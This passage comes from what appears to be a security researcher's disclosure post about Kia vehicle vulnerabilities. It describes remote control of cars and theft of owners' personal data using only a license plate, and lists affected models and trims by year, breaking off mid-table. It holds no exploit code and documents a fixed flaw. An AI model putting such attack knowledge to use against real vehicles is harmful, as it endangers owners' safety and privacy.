    "originBody": "‹ Back Hacking Kia: Remotely Controlling Cars With Just a License Plate Fri Sep 20 2024 Introduction On June 11th, 2024, we discovered a set of vulnerabilities in Kia vehicles that allowed remote control over key functions using only a license plate. These attacks could be executed remotely on any hardware-equipped vehicle in about 30 seconds, regardless of whether it had an active Kia Connect subscription. Additionally, an attacker could silently obtain personal information, including the victim's name, phone number, email address, and physical address. This would allow the attacker to add themselves as an invisible second user on the victim's vehicle without their knowledge. We built a tool to demonstrate the impact of these vulnerabilities where an attacker could simply (1) enter the license plate of a Kia vehicle, then (2) execute commands on the vehicle after around 30 seconds. These vulnerabilities have since been fixed, this tool was never released, and the Kia team has validated this was never exploited maliciously. Vehicles Affected Select Year 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 2015 2014 Select Model Select Trim Vehicle Geolocate Vehicle Remote Lock/Unlock Remote Start/Stop Remote Horn/Light Remote Camera 2025 CARNIVAL EX ✅ ✅ ✅ ✅ ❌ 2025 CARNIVAL SX ✅ ✅ ✅ ✅ ❌ 2025 CARNIVAL LX ✅ ✅ ✅ ✅ ❌ 2025 CARNIVAL LXS ✅ ✅ ✅ ✅ ❌ 2025 CARNIVAL SX PRESTIGE ✅ ✅ ✅ ✅ ❌ 2025 CARNIVAL HYBRID SX PRESTIGE ✅ ✅ ✅ ✅ ✅ 2025 CARNIVAL HYBRID EX ✅ ✅ ✅ ✅ ✅ 2025 CARNIVAL HYBRID LXS ✅ ✅ ✅ ✅ ✅ 2025 CARNIVAL HYBRID SX ✅ ✅ ✅ ✅ ✅ 2025 K5 EX ✅ ✅ ✅ ✅ ✅ 2025 K5 GT ✅ ✅ ✅ ✅ ✅ 2025 K5 GT (GT1 PKG) ✅ ✅ ✅ ✅ ✅ 2025 K5 GT-LINE ✅ ✅ ✅ ✅ ❌ 2025 K5 GT-LINE (PREMIUM PKG) ✅ ✅ ✅ ✅ ❌ 2025 K5 LXS ✅ ✅ ❌ ✅ ❌ 2025 SELTOS EX ✅ ✅ ✅ ✅ ❌ 2025 SELTOS S ✅ ✅ ✅ ✅ ❌ 2025 SELTOS SX ✅ ✅ ✅ ✅ ❌ 2025 SELTOS X-LINE ✅ ✅ ✅ ✅ ❌ 2025 SORENTO PHEV SX-PRESTIGE ✅ ✅ ✅ ✅ ✅ 2025 SORENTO PHEV EX ✅ ✅ ✅ ✅ ❌ 2025 SORENTO LX ✅ ✅ ✅ ✅ ❌ 2025 SOUL EX ✅ ✅ ✅ ✅ ❌ 2025 SOUL GT-LINE ✅ ✅ ✅ ✅ ❌ 2025 SOUL S ✅ ✅ ✅ ✅ ❌ 2025 SORENTO HYBRID EX ✅ ✅ ✅ ✅ ❌ 2025 SORENTO HYBRID SX-PRESTIGE ✅ ✅ ✅ ✅ ✅ 2025 SPORTAGE SX ✅ ✅ ✅ ✅ ✅ 2025 SPORTAGE X-LINE ✅ ✅ ✅ ✅ ✅ 2025 SPORTAGE X-PRO ✅ ✅ ✅ ✅ ✅ 2025 SPORTAGE EX ✅ ✅ ✅ ✅ ✅ 2025 SPORTAGE SX-PRESTIGE ✅ ✅ ✅ ✅ ✅ 2025 SPORTAGE X-PRO PRESTIGE ✅ ✅ ✅ ✅ ✅ 2025 SPORTAGE HYBRID EX ✅ ✅ ✅ ✅ ✅ 2025 SPORTAGE HYBRID SX-PRESTIGE ✅ ✅ ✅ ✅ ✅ 2025 SPORTAGE PHEV X-LINE ✅ ✅ ✅ ✅ ❌ 2025 SPORTAGE PHEV X-LINE PRESTIGE ✅ ✅ ✅ ✅ ✅ 2024 CARNIVAL SX ✅ ✅ ✅ ✅ ❌ 2024 CARNIVAL EX ✅ ✅ ✅ ✅ ❌ 2024 CARNIVAL SX PRESTIGE ✅ ✅ ✅ ✅ ❌ 2024 EV6 GT ✅ ✅ ✅ ✅ ❌ 2024 EV6 GT-LINE ✅ ✅ ✅ ✅ ❌ 2024 EV6 LIGHT ✅ ✅ ✅ ✅ ❌ 2024 EV6 WIND ✅ ✅ ✅ ✅ ❌ 2024 EV9 LAND ✅ ✅ ✅ ✅ ❌ 2024 EV9 GT-LINE ✅ ✅ ✅ ✅ ❌ 2024 EV9 LIGHT LR ✅ ✅ ✅ ✅ ❌ 2024 EV9 LIGHT SR ✅ ✅ ✅ ✅ ❌ 2024 EV9 WIND ✅ ✅ ✅ ✅ ❌ 2024 FORTE GT ✅ ✅ ✅ ✅ ❌ 2024 FORTE GT-LINE ✅ ✅ ✅ ✅ ❌ 2024 K5 EX ✅ ✅ ✅ ✅ ❌ 2024 K5 GT ✅ ✅ ✅ ✅ ❌ 2024 K5 GT-LINE ✅ ✅ ✅ ✅ ❌ 2024 NIRO SX ✅ ✅ ✅ ✅ ❌ 2024 NIRO EX ✅ ✅ ✅ ✅ ❌ 2024 NIRO EX TOURING ✅ ✅ ✅ ✅ ❌ 2024 NIRO SX TOURING ✅ ✅ ✅ ✅ ❌ 2024 NIRO PHEV SX TOURING ✅ ✅ ✅ ✅ ❌ 2024 NIRO PHEV EX ✅ ✅ ✅ ✅ ❌ 2024 SELTOS EX ✅ ✅ ✅ ✅ ❌ 2024 SELTOS SX ✅ ✅ ✅ ✅ ❌ 2024 SELTOS S ✅ ✅ ✅ ✅ ❌ 2024 SELTOS SX (SUNROOF PKG) ✅ ✅ ✅ ✅ ❌ 2024 SELTOS X-LINE ✅ ✅ ✅ ✅ ❌ 2024 NIRO EV WAVE ✅ ✅ ✅ ✅ ❌ 2024 NIRO EV WIND ✅ ✅ ✅ ✅ ❌ 2024 SORENTO X-LINE EX ✅ ✅ ✅ ✅ ✅ 2024 SORENTO EX ✅ ✅ ✅ ✅ ✅ 2024 SORENTO LX ✅ ✅ ✅ ✅ ✅ 2024 SORENTO S ✅ ✅ ✅ ✅ ✅ 2024 SORENTO SX ✅ ✅ ✅ ✅ ✅ 2024 SORENTO X-LINE SX ✅ ✅ ✅ ✅ ✅ 2024 SORENTO X-LINE SX-P ✅ ✅ ✅ ✅ ✅ 2024 SORENTO HYBRID SX-PRESTIGE ✅ ✅ ✅ ✅ ✅ 2024 SORENTO HYBRID EX ✅ ✅ ✅ ✅ ❌ 2024 SORENTO PHEV SX-PRESTIGE ✅ ✅ ✅ ✅ ✅ 2024 SOUL EX ✅ ✅ ✅ ✅ ❌ 2024 SOUL GT-Line ✅ ✅ ✅ ✅ ❌ 2024 SOUL S ✅ ✅ ✅ ✅ ❌ 2024 SPORTAGE EX ✅ ✅ ✅ ✅ ✅ 2024 SPORTAGE SX ✅ ✅ ✅ ✅ ✅ 2024 SPORTAGE X-LINE ✅ ✅ ✅ ✅ ✅ 2024 SPORTAGE SX-P ✅ ✅ ✅ ✅ ✅ 2024 SPORTAGE X-PRO ✅ ✅ ✅ ✅ ✅ 2024 SPORTAGE X-PRO PRST ✅ ✅ ✅ ✅ ✅ 2024 SPORTAGE HYBRID EX ✅ ✅ ✅ ✅ ✅ 2024 SPORTAGE HYBRID SX-PRESTIGE ✅ ✅ ✅ ✅ ✅ 2024 TELLURIDE SX ✅ ✅ ✅ ✅ ❌ 2024 TELLURIDE X-LINE EX ✅ ✅ ✅ ✅ ❌ 2024 TELLURIDE LX ✅ ✅ ✅ ✅ ❌ 2024 TELLURIDE EX ✅ ✅ ✅ ✅ ❌ 2024 TELLURIDE S ✅ ✅ ✅ ✅ ❌ 2024 TELLURIDE SX-PRESTIGE ✅ ✅ ✅ ✅ ❌ 2024 TELLURIDE X-LINE SX ✅ ✅ ✅ ✅ ❌ 2024 TELLURIDE X-LINE SX-PRESTIGE ✅ ✅ ✅ ✅ ❌ 2024 TELLURIDE X-PRO SX ✅ ✅ ✅ ✅ ❌ 2024 TELLURIDE X-PRO SX-PRESTIGE ✅ ✅ ✅ ✅ ❌ 2024 SPORTAGE PHEV X-LINE ✅ ✅ ✅ ✅ ❌ 2023 CARNIVAL EX ✅ ✅ ✅ ✅ ❌ 2023 CARNIVAL SX ✅ ✅ ✅ ✅ ❌ 2023 CARNIVAL SX Prestige ✅ ✅ ✅ ✅ ❌ 2023 EV6 GT ✅ ✅ ✅ ✅ ❌ 2023 EV6 GT-LINE ✅ ✅ ✅ ✅ ❌ 2023 EV6 LIGHT ✅ ✅ ✅ ✅ ❌ 2023 EV6 WIND ✅ ✅ ✅ ✅ ❌ 2023 K5 EX ✅ ✅ ✅ ✅ ❌ 2023 K5 GT ✅ ✅ ✅ ✅ ❌ 2023 K5 GT-LINE ✅ ✅ ✅ ✅ ❌ 2023 FORTE GT-LINE ✅ ✅ ✅ ✅ ❌ 2023 FORTE SX ✅ ✅ ✅ ✅ ❌ 2023 NIRO SX ✅ ✅ ✅ ✅ ❌ 2023 NIRO SX Touring ✅ ✅ ✅ ✅ ❌ 2023 NIRO TOURING ✅ ✅ ✅ ✅ ❌ 2023 NIRO EX ✅ ✅ ✅ ✅ ❌ 2023 NIRO TOURING SE ✅ ✅ ✅ ✅ ❌ 2023 NIRO EX Touring ✅ ✅ ✅ ✅ ❌ 2023 NIRO S ✅ ✅ ✅ ✅ ❌ 2023 SELTOS Nightfall ✅ ✅ ✅ ✅ ❌ 2023 SELTOS EX ✅ ✅ ✅ ✅ ❌ 2023 SELTOS SX ✅ ✅ ✅ ✅ ❌ 2023 SELTOS S ✅ ✅ ✅ ✅ ❌ 2023 SORENTO EX SPORT ✅ ✅ ✅ ✅ ✅ 2023 SORENTO SX-PRESTIGE ✅ ✅ ✅ ✅ ✅ 2023 SORENTO S ✅ ✅ ✅ ✅ ✅ 2023 SORENTO SX ✅ ✅ ✅ ✅ ✅ 2023 SORENTO X-LINE EX ✅ ✅ ✅ ✅ ✅ 2023 SORENTO X-LINE SX-PRESTIGE ✅ ✅ ✅ ✅ ✅ 2023 SORENTO X-LINE S ✅ ✅ ✅ ✅ ✅ 2023 NIRO EV WAVE ✅ ✅ ✅ ✅ ❌ 2023 NIRO EV WIND ✅ ✅ ✅ ✅ ❌ 2023 NIRO PHEV EX ✅ ✅ ✅ ✅ ❌ 2023 NIRO PHEV SX TOURING ✅ ✅ ✅ ✅ ❌ 2023 RIO S ✅ ✅ ✅ ✅ ❌ 2023 SORENTO HYBRID SX-P ✅ ✅ ✅ ✅ ✅ 2023 SORENTO HYBRID EX ✅ ✅ ✅ ✅ ❌ 2023 SOUL GT-Line ✅ ✅ ✅ ✅ ❌ 2023 SOUL EX ✅ ✅ ✅ ✅ ❌ 2023 SOUL S ✅ ✅ ✅ ✅ ❌ 2023 SORENTO PHEV SX-PRESTIGE ✅ ✅ ✅ ✅ ✅ 2023 SPORTAGE EX ✅ ✅ ✅ ✅ ✅ 2023 SPORTAGE X-Line ✅ ✅ ✅ ✅ ✅ 2023 SPORTAGE SX ✅ ✅ ✅ ✅ ✅ 2023 SPORTAGE SX-Prestige ✅ ✅ ✅ ✅ ✅ 2023 SPORTAGE X-Pro Prestige ✅ ✅ ✅ ✅ ✅ 2023 SPORTAGE X-Pro ✅ ✅ ✅ ✅ ✅ 2023 SPORTAGE PHEV X-Line Prestige ✅ ✅ ✅ ✅ ✅ 2023 SPORTAGE PHEV X-Line ✅ ✅ ✅ ✅ ✅ 2023 SPORTAGE HYBRID EX ✅ ✅ ✅ ✅ ✅ 2023 SPORTAGE HYBRID SX-Prestige ✅ ✅ ✅ ✅ ✅ 2023 TELLURIDE LX ✅ ✅ ✅ ✅ ❌ 2023 TELLURIDE EX ✅ ✅ ✅ ✅ ❌ 2023 TELLURIDE X-PRO SX-PRESTIGE ✅ ✅ ✅ ✅ ❌ 2023 TELLURIDE SX ✅ ✅ ✅ ✅ ❌ 2023 TELLURIDE SX-PRESTIGE ✅ ✅ ✅ ✅ ❌ 2023 TELLURIDE X-LINE EX ✅ ✅ ✅ ✅ ❌ 2023 TELLURIDE X-PRO SX ✅ ✅ ✅ ✅ ❌ 2023 TELLURIDE X-LINE SX-PRESTIGE ✅ ✅ ✅ ✅ ❌ 2023 STINGER GT-Line ✅ ✅ ✅ ✅ ✅ 2023 STINGER GT2 ✅ ✅ ✅ ✅ ✅ 2022 EV6 GT-Line ✅ ✅ ✅ ✅ ❌ 2022 EV6 GT-Line (1st Edition) ✅ ✅ ✅ ✅ ❌ 2022 EV6 LIGHT ✅ ✅ ✅ ✅ ❌ 2022 EV6 WIND ✅ ✅ ✅ ✅ ❌ 2022 EV6 WIND (Technology Pkg) ✅ ✅ ✅ ✅ ❌ 2022 CARNIVAL EX ✅ ✅ ✅ ✅ ❌ 2022 CARNIVAL SX ✅ ✅ ✅ ✅ ❌ 2022 CARNIVAL SX PRESTIGE ✅ ✅ ✅ ✅ ❌ 2022 FORTE GT ✅ ✅ ✅ ✅ ❌ 2022 FORTE GT-Line (Premium) ✅ ✅ ✅ ✅ ❌ 2022 FORTE GT (GT2) ✅ ✅ ✅ ✅ ❌ 2022 FORTE GT (Technology Pkg) ✅ ✅ ✅ ✅ ❌ 2022 FORTE GT-Line ✅ ✅ ✅ ✅ ❌ 2022 FORTE GT-Line (Sport Premium) ✅ ✅ ✅ ✅ ❌ 2022 FORTE GT-Line (Technology Pkg) ✅ ✅ ✅ ✅ ❌ 2022 K5 GL-Line Premium ✅ ✅ ✅ ✅ ❌ 2022 K5 EX ✅ ✅ ✅ ✅ ❌ 2022 K5 EX (Premium Pkg) ✅ ✅ ✅ ✅ ❌ 2022 K5 GT ✅ ✅ ✅ ✅ ❌ 2022 K5 GT (GT1 Pkg) ✅ ✅ ✅ ✅ ❌ 2022 K5 GT-LINE ✅ ✅ ✅ ✅ ❌ 2022 K5 GT-Line (AWD) ✅ ✅ ✅ ✅ ❌ 2022 K5 GT-Line (Premium Pkg) ✅ ✅ ✅ ✅ ❌ 2022 NIRO EX Premium ✅ ✅ ✅ ✅ ❌ 2022 NIRO Touring Special Edition ✅ ✅ ✅ ✅ ❌ 2022 NIRO EV EX ✅ ✅ ✅ ✅ ❌ 2022 NIRO EV EX (Display) ✅ ✅ ✅ ✅ ❌ 2022 NIRO EV EX Premium ✅ ✅ ✅ ✅ ❌ 2022 NIRO EV S ✅ ✅ ✅ ✅ ❌ 2022 NIRO PHEV EX ✅ ✅ ✅ ✅ ❌ 2022 NIRO PHEV EX Premium ✅ ✅ ✅ ✅ ❌ 2022 NIRO PHEV LXS ✅ ✅ ✅ ✅ ❌ 2022 RIO S (4D/Tech. Pkg) ✅ ✅ ✅ ✅ ❌ 2022 RIO S (5D/Tech. Pkg) ✅ ✅ ✅ ✅ ❌ 2022 SELTOS EX ✅ ✅ ✅ ✅ ❌ 2022 SELTOS Nightfall ✅ ✅ ✅ ✅ ❌ 2022 SELTOS S ✅ ✅ ✅ ✅ ❌ 2022 SELTOS SX Turbo ✅ ✅ ✅ ✅ ❌ 2022 SELTOS SX Turbo (Sunroof) ✅ ✅ ✅ ✅ ❌ 2022 SORENTO EX ✅ ✅ ✅ ✅ ✅ 2022 SORENTO S ✅ ✅ ✅ ✅ ✅ 2022 SORENTO SX ✅ ✅ ✅ ✅ ✅ 2022 SORENTO SX Prestige ✅ ✅ ✅ ✅ ✅ 2022 SORENTO X-Line EX ✅ ✅ ✅ ✅ ✅ 2022 SORENTO X-Line S ✅ ✅ ✅ ✅ ✅ 2022 SORENTO X-Line SX Prestige ✅ ✅ ✅ ✅ ✅ 2022 SORENTO HYBRID S ✅ ✅ ✅ ✅ ✅ 2022 SORENTO HYBRID EX ✅ ✅ ✅ ✅ ❌ 2022 SPORTAGE EX (Technology Pkg) ✅ ✅ ✅ ✅ ❌ 2022 SPORTAGE Nightfall (Premium Pkg) ✅ ✅ ✅ ✅ ❌ 2022 SPORTAGE SX Turbo ✅ ✅ ✅ ✅ ❌ 2022 SORENTO PHEV SX ✅ ✅ ✅ ✅ ✅ 2022 SORENTO PHEV SX-P ✅ ✅ ✅ ✅ ✅ 2022 SOUL EXCLAIM ✅ ✅ ✅ ✅ ❌ 2022 SOUL GT-LINE ✅ ✅ ✅ ✅ ❌ 2022 SOUL X-LINE ✅ ✅ ✅ ✅ ❌ 2022 SOUL S ✅ ✅ ✅ ✅ ❌ 2022 STINGER GT-Line ✅ ✅ ✅ ✅ ✅ 2022 STINGER GT1 (Special Edition) ✅ ✅ ✅ ✅ ✅ 2022 STINGER GT-Line (Sun & Sound) ✅ ✅ ✅ ✅ ✅ 2022 STINGER GT1 ✅ ✅ ✅ ✅ ✅ 2022 STINGER GT2 ✅ ✅ ✅ ✅ ✅ 2022 STINGER GT2 (Special Edition) ✅ ✅ ✅ ✅ ✅ 2022 TELLURIDE EX (Black Ed, Prem. Pkg, Tow Pkg) ✅ ✅ ✅ ✅ ❌ 2022 TELLURIDE EX (Black Ed, Prem. Pkg) ✅ ✅ ✅ ✅ ❌ 2022 TELLURIDE EX (Premium Pkg) ✅ ✅ ✅ ✅ ❌ 2022 TELLURIDE EX (Premium + Tow Pkg) ✅ ✅ ✅ ✅ ❌ 2022 TELLURIDE EX (Std) ✅ ✅ ✅ ✅ ❌ 2022 TELLURIDE EX (Towing Pkg) ✅ ✅ ✅ ✅ ❌ 2022 TELLURIDE LX (Std) ✅ ✅ ✅ ✅ ❌ 2022 TELLURIDE SX (Black Ed, Prestige Pkg) ✅ ✅ ✅ ✅ ❌ 2022 TELLURIDE S (Std) ✅ ✅ ✅ ✅ ❌ 2022 TELLURIDE SX (Black Ed) ✅ ✅ ✅ ✅ ❌ 2022 TELLURIDE SX (Black Ed, Prestige + Tow Pkg) ✅ ✅ ✅ ✅ ❌ 2022 TELLURIDE SX (Prestige + Towing Pkg) ✅ ✅ ✅ ✅ ❌ 2022 TELLURIDE SX (Prestige Pkg) ✅ ✅ ✅ ✅ ❌ 2022 TELLURIDE SX (Std) ✅ ✅ ✅ ✅ ❌ 2022 TELLURIDE SX (Towing Pkg) ✅ ✅ ✅ ✅ ❌ 2021 FORTE EX ✅ ✅ ✅ ✅ ❌ 2021 FORTE GT ❌ ❌ ❌ ❌ ❌ 2021 FORTE GT (Premium Pkg) ❌ ❌ ❌ ❌ ❌ 2021 FORTE GT-Line (Premium) ❌ ❌ ❌ ❌ ❌ 2021 K5 EX ✅ ✅ ✅ ✅ ❌ 2021 K5 GT (GT1 Pkg) ✅ ✅ ✅ ✅ ❌ 2021 K5 EX (Premium Pkg) ✅ ✅ ✅ ✅ ❌ 2021 K5 GT-Line ✅ ✅ ✅ ✅ ❌ 2021 K5 GT-Line (Special Ed.) ✅ ✅ ✅ ✅ ❌ 2021 K5 LXS (AWD) ✅ ✅ ✅ ✅ ❌ 2021 NIRO EV EX ✅ ✅ ✅ ✅ ❌ 2021 NIRO EV EX PREMIUM ✅ ✅ ✅ ✅ ❌ 2021 NIRO EX PREMIUM ✅ ✅ ✅ ✅ ❌ 2021 NIRO TOURING ✅ ✅ ✅ ✅ ❌ 2021 NIRO TOURING SPECIAL EDITION ✅ ✅ ✅ ✅ ❌ 2021 SEDONA EX ❌ ❌ ❌ ❌ ❌ 2021 SEDONA SX ✅ ❌ ❌ ❌ ❌ 2021 SEDONA EX (Premium Pkg) ❌ ❌ ❌ ❌ ❌ 2021 NIRO PHEV EX ✅ ✅ ✅ ✅ ❌ 2021 NIRO PHEV LXS ✅ ✅ ✅ ✅ ❌ 2021 NIRO PHEV EX Premium ✅ ✅ ✅ ✅ ❌ 2021 RIO S (4D/Tech. Pkg) ✅ ❌ ❌ ❌ ❌ 2021 SELTOS SX Turbo ✅ ✅ ✅ ✅ ❌ 2021 SELTOS SX Turbo (Sunroof) ✅ ✅ ✅ ✅ ❌ 2021 SORENTO SX ✅ ✅ ✅ ✅ ✅ 2021 SORENTO EX ✅ ✅ ✅ ✅ ❌ 2021 SORENTO EX (Pano Pkg) ✅ ✅ ✅ ✅ ❌ 2021 SORENTO S ✅ ✅ ✅ ✅ ❌ 2021 SORENTO S (Pano Pkg) ✅ ✅ ✅ ✅ ❌ 2021 SORENTO SX-P ✅ ✅ ✅ ✅ ✅ 2021 SORENTO SX-P (X-Line) ✅ ✅ ✅ ✅ ✅ 2021 SOUL EX ✅ ✅ ✅ ✅ ❌ 2021 SOUL Turbo ✅ ✅ ✅ ✅ ❌ 2021 STINGER GT-Line (Sun & Sound Pkg) ✅ ❌ ❌ ❌ ❌ 2021 STINGER GT ❌ ❌ ❌ ❌ ❌ 2021 STINGER GT-Line ❌ ❌ ❌ ❌ ❌ 2021 STINGER GT1 ✅ ❌ ❌ ❌ ❌ 2021 STINGER GT2 ✅ ❌ ❌ ❌ ❌ 2021 SPORTAGE EX (Technology Pkg) ✅ ✅ ✅ ✅ ❌ 2021 SPORTAGE S (Premium Pkg) ✅ ✅ ✅ ✅ ❌ 2021 SPORTAGE SX Turbo ✅ ✅ ✅ ✅ ❌ 2021 TELLURIDE EX (Black Ed, Prem. Pkg, Tow Pkg) ✅ ✅ ✅ ✅ ❌ 2021 TELLURIDE EX ✅ ✅ ✅ ✅ ❌ 2021 TELLURIDE EX (Premium + Tow Pkg) ✅ ✅ ✅ ✅ ❌ 2021 TELLURIDE EX (Premium Pkg) ✅ ✅ ✅ ✅ ❌ 2021 TELLURIDE SX (Black Ed, Prestige Pkg) ✅ ✅ ✅ ✅ ❌ 2021 TELLURIDE EX (Towing Pkg) ✅ ✅ ✅ ✅ ❌ 2021 TELLURIDE SX (Black Ed, Tow Pkg) ✅ ✅ ✅ ✅ ❌ 2021 TELLURIDE LX ✅ ✅ ✅ ✅ ❌ 2021 TELLURIDE S ✅ ✅ ✅ ✅ ❌ 2021 TELLURIDE SX ✅ ✅ ✅ ✅ ❌ 2021 TELLURIDE SX (Black Ed) ✅ ✅ ✅ ✅ ❌ 2021 TELLURIDE SX (Prestige + Towing Pkg) ✅ ✅ ✅ ✅ ❌ 2021 TELLURIDE SX (Black Ed, Prestige + Tow Pkg) ✅ ✅ ✅ ✅ ❌ 2021 TELLURIDE SX (Prestige Pkg) ✅ ✅ ✅ ✅ ❌ 2021 TELLURIDE SX (Std) ✅ ✅ ✅ ✅ ❌ 2021 TELLURIDE SX (Towing Pkg) ✅ ✅ ✅ ✅ ❌ 2020 FORTE EX (Special Edition) ✅ ✅ ✅ ✅ ❌ 2020 FORTE GT (GT2) (Auto Climate) ❌ ❌ ❌ ❌ ❌ 2020 FORTE EX ❌ ❌ ❌ ❌ ❌ 2020 FORTE GT-Line (Premium) ❌ ❌ ❌ ❌ ❌ 2020 FORTE GT-Line (Premium, Auto Climate) ❌ ❌ ❌ ❌ ❌ 2020 FORTE GT ❌ ❌ ❌ ❌ ❌ 2020 FORTE GT (Auto Climate) ❌ ❌ ❌ ❌ ❌ 2020 FORTE GT (GT2) ❌ ❌ ❌ ❌ ❌ 2020 CADENZA Limited ✅ ✅ ✅ ✅ ❌ 2020 CADENZA Technology ✅ ✅ ✅ ✅ ❌ 2020 K900 Luxury ✅ ✅ ✅ ✅ ❌ 2020 NIRO EV EX ✅ ✅ ✅ ✅ ❌ 2020 NIRO EV EX Premium ✅ ✅ ✅ ✅ ❌ 2020 NIRO PHEV LXS ✅ ✅ ✅ ✅ ❌ 2020 NIRO PHEV EX ✅ ✅ ✅ ✅ ❌ 2020 NIRO PHEV EX Premium ✅ ✅ ✅ ✅ ❌ 2020 NIRO EX Premium ✅ ✅ ✅ ✅ ❌ 2020 NIRO Touring Special Edition ✅ ✅ ✅ ✅ ❌ 2020 NIRO Touring ✅ ✅ ✅ ✅ ❌ 2020 OPTIMA EX Premium ✅ ✅ ✅ ✅ ❌ 2020 OPTIMA PHEV EX (Technology Pkg) ✅ ✅ ✅ ✅ ❌ 2020 SEDONA EX (Premium Pkg, Rear Seat Ent. ) ❌ ❌ ❌ ❌ ❌ 2020 SEDONA EX ❌ ❌ ❌ ❌ ❌ 2020 SEDONA EX (Premium Pkg) ❌ ❌ ❌ ❌ ❌ 2020 SEDONA EX (Rear Seat Ent.) ❌ ❌ ❌ ❌ ❌ 2020 SEDONA SX ✅ ❌ ❌ ❌ ❌ 2020 SEDONA SX (Rear Seat Ent.) ✅ ❌ ❌ ❌ ❌ 2020 RIO S (4D/Tech. Pkg) ❌ ❌ ❌ ❌ ❌ 2020 RIO S (5D/Tech. Pkg) ❌ ❌ ❌ ❌ ❌ 2020 SOUL EX ✅ ✅ ✅ ✅ ❌ 2020 SOUL EX (Designer) ✅ ✅ ✅ ✅ ❌ 2020 SOUL GT 1.6L Turbo ✅ ✅ ✅ ✅ ❌ 2020 SORENTO SX ✅ ✅ ✅ ✅ ❌ 2020 SPORTAGE EX (Technology Pkg) ✅ ✅ ✅ ✅ ❌ 2020 SPORTAGE S (Premium Pkg) ✅ ✅ ✅ ✅ ❌ 2020 SPORTAGE SX Turbo (Beige) ✅ ✅ ✅ ✅ ❌ 2020 SPORTAGE SX Turbo (Std) ✅ ✅ ✅ ✅ ❌ 2020 TELLURIDE EX (Premium + Tow Pkg) ✅ ✅ ✅ ✅ ❌ 2020 TELLURIDE EX (Premium Pkg) ✅ ✅ ✅ ✅ ❌ 2020 TELLURIDE S (8 Passenger) ✅ ✅ ✅ ✅ ❌ 2020 TELLURIDE EX ✅ ✅ ✅ ✅ ❌ 2020 TELLURIDE SX (Prestige Pkg) ✅ ✅ ✅ ✅ ❌ 2020 TELLURIDE EX (Towing Pkg) ✅ ✅ ✅ ✅ ❌ 2020 TELLURIDE LX ✅ ✅ ✅ ✅ ❌ 2020 TELLURIDE S ✅ ✅ ✅ ✅ ❌ 2020 TELLURIDE SX ✅ ✅ ✅ ✅ ❌ 2020 TELLURIDE SX (Prestige + Towing Pkg) ✅ ✅ ✅ ✅ ❌ 2020 TELLURIDE SX (Towing Pkg) ✅ ✅ ✅ ✅ ❌ 2020 STINGER GT ❌ ❌ ❌ ❌ ❌ 2020 STINGER GT-Line ❌ ❌ ❌ ❌ ❌ 2020 STINGER GT1 ✅ ❌ ❌ ❌ ❌ 2020 STINGER GT2 ✅ ❌ ❌ ❌ ❌ 2019 FORTE EX ❌ ❌ ❌ ❌ ❌ 2019 FORTE S (Premium) ❌ ❌ ❌ ❌ ❌ 2019 FORTE EX (Launch) ✅ ❌ ❌ ❌ ❌ 2019 FORTE S ❌ ❌ ❌ ❌ ❌ 2019 CADENZA Cadenza (Ltd) ✅ ❌ ❌ ❌ ❌ 2019 CADENZA Cadenza (Premium) ❌ ❌ ❌ ❌ ❌ 2019 CADENZA Cadenza (Technology) ✅ ❌ ❌ ❌ ❌ 2019 NIRO EX (Adv. Technology) ❌ ❌ ❌ ❌ ❌ 2019 NIRO EX (Premium) ✅ ❌ ❌ ❌ ❌ 2019 NIRO LX ❌ ❌ ❌ ❌ ❌ 2019 NIRO LX (Adv. Tech) ❌ ❌ ❌ ❌ ❌ 2019 NIRO EX (Std) ❌ ❌ ❌ ❌ ❌ 2019 NIRO FE ❌ ❌ ❌ ❌ ❌ 2019 NIRO S Touring ✅ ❌ ❌ ❌ ❌ 2019 NIRO Touring ✅ ❌ ❌ ❌ ❌ 2019 K900 Luxury ✅ ✅ ✅ ✅ ❌ 2019 K900 Luxury (VIP) ✅ ✅ ✅ ✅ ❌ 2019 NIRO EV EX (Battery Heater) ✅ ✅ ✅ ✅ ❌ 2019 NIRO EV EX ✅ ✅ ✅ ✅ ❌ 2019 NIRO EV EX (Battery Heater, Wireless Charger) ✅ ✅ ✅ ✅ ❌ 2019 NIRO EV EX Premium ✅ ✅ ✅ ✅ ❌ 2019 NIRO EV EX Premium (Battery Heater) ✅ ✅ ✅ ✅ ❌ 2019 NIRO EV EX Premium (Launch Ed.) ✅ ✅ ✅ ✅ ❌ 2019 NIRO EV EX Premium (Launch Ed., Battery Heater) ✅ ✅ ✅ ✅ ❌ 2019 NIRO PHEV EX ✅ ✅ ✅ ✅ ❌ 2019 NIRO PHEV EX Premium ✅ ✅ ✅ ✅ ❌ 2019 NIRO PHEV LX ✅ ✅ ✅ ✅ ❌ 2019 OPTIMA EX ✅ ✅ ✅ ✅ ❌ 2019 OPTIMA EX (Premium Pkg) ✅ ✅ ✅ ✅ ❌ 2019 OPTIMA EX AT (Premium Pkg) ✅ ✅ ✅ ✅ ❌ 2019 OPTIMA LX AT (Premium) ✅ ✅ ❌ ✅ ❌ 2019 OPTIMA S ✅ ✅ ✅ ✅ ❌ 2019 OPTIMA SX Turbo ✅ ✅ ✅ ✅ ❌ 2019 OPTIMA SX Turbo (Ltd) ✅ ✅ ✅ ✅ ❌ 2019 OPTIMA HYBRID EX (Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2019 OPTIMA PHEV EX ✅ ✅ ✅ ✅ ❌ 2019 OPTIMA PHEV EX (Technology Pkg) ✅ ✅ ✅ ✅ ❌ 2019 RIO S AT(4D/Technology Pkg) ❌ ❌ ❌ ❌ ❌ 2019 RIO S AT(5D/Technology Pkg) ❌ ❌ ❌ ❌ ❌ 2019 SEDONA EX ❌ ❌ ❌ ❌ ❌ 2019 SEDONA EX (Premium + Rear Ent.) ❌ ❌ ❌ ❌ ❌ 2019 SEDONA EX (Premium Pkg) ❌ ❌ ❌ ❌ ❌ 2019 SEDONA EX AT (Rear Ent. Sys) ❌ ❌ ❌ ❌ ❌ 2019 SEDONA S (Rear Ent. Sys) ✅ ❌ ❌ ❌ ❌ 2019 SEDONA SX ✅ ❌ ❌ ❌ ❌ 2019 SORENTO EX Sport ❌ ❌ ❌ ❌ ❌ 2019 SORENTO EX ✅ ❌ ❌ ❌ ❌ 2019 SORENTO EX (Touring Pkg) ✅ ❌ ❌ ❌ ❌ 2019 SORENTO Limited ✅ ❌ ❌ ❌ ❌ 2019 SORENTO EX (Touring) ✅ ❌ ❌ ❌ ❌ 2019 SORENTO LX (Convenience) ❌ ❌ ❌ ❌ ❌ 2019 SORENTO SX ✅ ❌ ❌ ❌ ❌ 2019 SOUL LX ❌ ❌ ❌ ❌ ❌ 2019 SOUL Exclaim ✅ ❌ ❌ ❌ ❌ 2019 